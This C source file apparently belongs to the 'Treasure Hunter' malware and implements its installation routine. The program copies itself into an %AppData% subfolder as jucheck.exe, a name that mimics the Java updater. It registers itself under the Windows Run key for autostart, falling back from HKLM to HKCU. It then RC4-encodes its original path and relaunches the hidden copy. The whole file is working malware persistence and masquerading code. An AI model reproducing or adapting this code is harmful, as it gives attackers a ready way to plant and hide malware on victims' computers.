#include <Shlobj.h>

int createRegistryKey(char *newFilePath){
	HKEY hKey;
	DWORD error;

	error = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);

	if (error != ERROR_SUCCESS){
		if (error == ERROR_ACCESS_DENIED){
			showDebugMessage(L"Error opening registry key for autostart in HKLM - not enough rights, trying to open in HKCU", 0);
			if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS){
				showDebugMessage(L"Unknown error opening registry key for autostart", 0);
				RegCloseKey(hKey);
				return 0;
			}
		} else {
			showDebugMessage(L"Unknown error opening registry key for autostart", 0);
			RegCloseKey(hKey);
			return 0;
		}
	}
	
	if (RegSetValueExA(hKey, "jucheck", 0, REG_SZ, (BYTE*)newFilePath, (strlen(newFilePath)+1) * 2) != ERROR_SUCCESS){
		showDebugMessage(L"Error creating registry key for autostart", 0);
		RegCloseKey(hKey);
		return 0;
	}

	showDebugMessage(L"Successfully created registry key for autostart", 0);
	RegCloseKey(hKey);
	return 1;
}

int selfCopyAndExecute(HANDLE mutex, char *compID){
	char szFilePath[MAX_PATH], *filePathEncoded, dirPath[MAX_PATH], *cmdArgs, *newDirPath, *newFilePath;
	int dirPathLen;
	DWORD mutexResult;
	STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

	ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    ZeroMemory(&processInfo, sizeof(processInfo));

	mutexResult = WaitForSingleObject(mutex, 0);

	if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, dirPath) == S_OK){
		dirPathLen = strlen(dirPath);
		if (dirPathLen < MAX_PATH-1){
			dirPath[dirPathLen] = '\\';
			dirPathLen ++;
		}

		newDirPath = combineArrs(dirPath, dirPathLen, compID, 32);
		newFilePath = combineArrs(newDirPath, dirPathLen  + 32, "\\jucheck.exe", 12);
 
		// Get current executable path
		if (GetModuleFileNameA(NULL, szFilePath, MAX_PATH) < 0){
			showDebugMessage(L"Cannot get the current file path", 0);
			return 0;
		}

		if (compareArrays(newFilePath, szFilePath, 0, dirPathLen + 44) == 1){
			showDebugMessage(L"Already running from the desired location", 0);
			return 2;
		}

		if (CreateDirectoryA(newDirPath, NULL) > 0){
			showDebugMessage(L"Successfully created the directory", 0);
			if (CopyFileA(szFilePath, newFilePath, TRUE) > 0){
				showDebugMessage(L"Successfully copied the file", 0);
			} else {
				showDebugMessage(L"Failed to copy the file", 0);
				return 0;
			}
		} else if (mutexResult == WAIT_OBJECT_0 || mutexResult == WAIT_ABANDONED){
			showDebugMessage(L"Failed to create the directory, entering re-install (update) mode", 0);
			if (DeleteFileA(newFilePath) > 0){
				showDebugMessage(L"Successfully deleted destination file", 0);
				if (CopyFileA(szFilePath, newFilePath, TRUE) > 0){
					showDebugMessage(L"Successfully copied the file", 0);
				} else {
					showDebugMessage(L"Failed to copy the file", 0);
					return 0;
				}
			} else {
				showDebugMessage(L"Failed to delete the destination file", 0);
				return 0;
			}
		} else if (mutexResult == WAIT_TIMEOUT){
			showDebugMessage(L"Error - Treasure Hunter is already running on this computer! To re-install, close the jucheck.exe process and try again", 0);
			return 0;
		} else {
			showDebugMessage(L"An unknown error occured!", 0);
			return 0;
		}
	} else {
		showDebugMessage(L"Cannot find %AppData%!", 0);
		return 0;
	}

	if (createRegistryKey(newFilePath) == 0)
		return 0;

	filePathEncoded = rc4(firstEncKey, (unsigned char*)szFilePath, 0, 1);
	newFilePath[dirPathLen + 44] = ' ';
	cmdArgs = combineArrs(newFilePath, dirPathLen + 45, filePathEncoded, strlen(filePathEncoded));
	newFilePath[dirPathLen + 44] = '\0';

	if (CreateProcessA(newFilePath, cmdArgs, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, newDirPath, &startupInfo, &processInfo) <= 0){
		showDebugMessage(L"Failed to execute the file", 0);
		return 0;
	} else {
		showDebugMessage(L"Successfully executed the file", 0);
		return 1;
	}
}